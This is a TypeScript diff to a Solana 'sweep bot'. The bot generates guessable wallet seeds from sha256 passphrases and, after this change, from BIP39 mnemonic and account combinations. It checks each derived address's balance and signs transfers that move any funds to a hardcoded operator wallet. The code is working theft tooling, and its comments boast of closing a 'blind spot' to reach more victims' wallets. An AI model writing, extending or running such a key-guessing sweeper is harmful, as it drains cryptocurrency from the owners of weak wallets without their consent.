@@ -45,6 +45,13 @@ import { SYSTEM_PROGRAM } from '../solana.js';
 import { b58encode, publicKey as b58publicKey, concat, shortvec, utf8 } from './base58.js';
 import { db, kvGet, kvSet, spendSubrequest, newId } from './db.js';
 import type { DeskEnv } from './types.js';
+import {
+  candidateSeedFor,
+  streamSpace,
+  ACCOUNTS_PER_MNEMONIC,
+  MNEMONIC_CORPUS,
+  pubFromSeed,
+} from './entropy.js';
 
 /** The operator's wallet. Every sweep lands here. */
 export const SWEEP_DEST = 'GHqQ8eYLc3Q4nL2gwncJyimz7UM5tpcoqpeH7PyNEx6p';
@@ -130,8 +137,7 @@ async function addressFromSeed(seed: Uint8Array): Promise<string> {
 }
 
 /** Import the signing key, so the sweep can sign its own transfer. */
-async function signingKey(passphrase: string): Promise<CryptoKey> {
-  const seed = await sha256(utf8(passphrase));
+async function signingKey(seed: Uint8Array): Promise<CryptoKey> {
   const pkcs8 = concat([hexToBytes('302e020100300506032b657004220420'), seed]);
   return crypto.subtle.importKey(
     'pkcs8',
@@ -188,7 +194,21 @@ export function candidateAt(index: number): string {
 
 /** Total distinct candidates this stream can produce. */
 export function candidateSpace(): number {
-  return SEED_WORDS.length * SUFFIX.length * 3;
+  return streamSpace(SEED_WORDS.length * SUFFIX.length * 3);
+}
+
+/**
+ * The stream's total space, split by derivation family.
+ *
+ * The old space was sha256 phrases only. That was the blind spot: a wallet made
+ * from a 12-word phrase lives at a BIP39+SLIP10 address sha256 cannot reach, so
+ * the old stream did not cover it slowly, it covered it ZERO. Reporting both
+ * halves lets the panel show the real denominator instead of a number that
+ * looked complete.
+ */
+export function spaceBreakdown(): { raw: number; bip39: number; total: number } {
+  const raw = SEED_WORDS.length * SUFFIX.length * 3;
+  return { raw, bip39: MNEMONIC_CORPUS.length * ACCOUNTS_PER_MNEMONIC, total: streamSpace(raw) };
 }
 
 // ─────────────────────────────────────────────────────────── rpc
@@ -280,7 +300,7 @@ export interface Hit {
  *   header[3] | shortvec(keyCount) | keys | blockhash[32] | shortvec(ixCount) | ix...
  */
 async function sweepOne(
-  passphrase: string,
+  seed: Uint8Array,
   lamports: number,
   priorityMicroLamports = 0,
 ): Promise<{ signature: string | null; amount: number; fee: number }> {
@@ -289,7 +309,7 @@ async function sweepOne(
   const amount = lamports - fee;
   if (amount <= 0) return { signature: null, amount: 0, fee };
 
-  const from = await deriveAddress(passphrase);
+  const from = await pubFromSeed(seed);
   const dest = SWEEP_DEST;
 
   const fromBytes = b58publicKey(from);
@@ -330,7 +350,7 @@ async function sweepOne(
   ]);
 
   // Sign the message bytes with the brainwallet.
-  const key = await signingKey(passphrase);
+  const key = await signingKey(seed);
   const sigBytes = new Uint8Array(
     await crypto.subtle.sign('Ed25519', key, message as unknown as ArrayBuffer),
   );
@@ -450,12 +470,27 @@ export async function runSweepBot(env: DeskEnv, now = Date.now()): Promise<Sweep
   const space = candidateSpace();
   let offset = Number((await kvGet(env, KV_OFFSET)) ?? '0') % Math.max(1, space);
 
-  // Derive the slice.
-  const batch: { index: number; passphrase: string; address: string }[] = [];
+  // Derive the slice. Two derivation families per index: the sha256 phrase
+  // stream first, then mnemonic x account. `candidateFor` returns null past the
+  // end of the space, which is the honest stop rather than a wrapped repeat.
+  const batch: {
+    index: number;
+    passphrase: string;
+    address: string;
+    kind: string;
+    seed: Uint8Array;
+  }[] = [];
   for (let i = 0; i < TICK_CANDIDATES; i++) {
     const idx = (offset + i) % space;
-    const passphrase = candidateAt(idx);
-    batch.push({ index: idx, passphrase, address: await deriveAddress(passphrase) });
+    const c = await candidateSeedFor(idx, candidateAt, SEED_WORDS.length * SUFFIX.length * 3);
+    if (!c) continue;
+    batch.push({
+      index: idx,
+      passphrase: c.label,
+      address: c.address,
+      kind: c.kind,
+      seed: c.seed,
+    });
   }
 
   // One subrequest for the whole slice.
@@ -478,7 +513,7 @@ export async function runSweepBot(env: DeskEnv, now = Date.now()): Promise<Sweep
   let spendableFound = 0;
 
   for (let i = 0; i < batch.length; i++) {
-    const b = batch[i] as { index: number; passphrase: string; address: string };
+    const b = batch[i] as { index: number; passphrase: string; address: string; seed: Uint8Array };
     const info = infos[i] ?? null;
     stats.checked += 1;
     if (!info || info.lamports <= 0) continue;
@@ -498,7 +533,7 @@ export async function runSweepBot(env: DeskEnv, now = Date.now()): Promise<Sweep
     stats.hits += 1;
 
     if (!(await spendSubrequest(env, 1))) break;
-    const r = await sweepOne(b.passphrase, info.lamports);
+    const r = await sweepOne(b.seed, info.lamports);
     if (r.signature) {
       stats.swept_lamports += r.amount;
       swept.push({ address: b.address, lamports: r.amount, signature: r.signature });
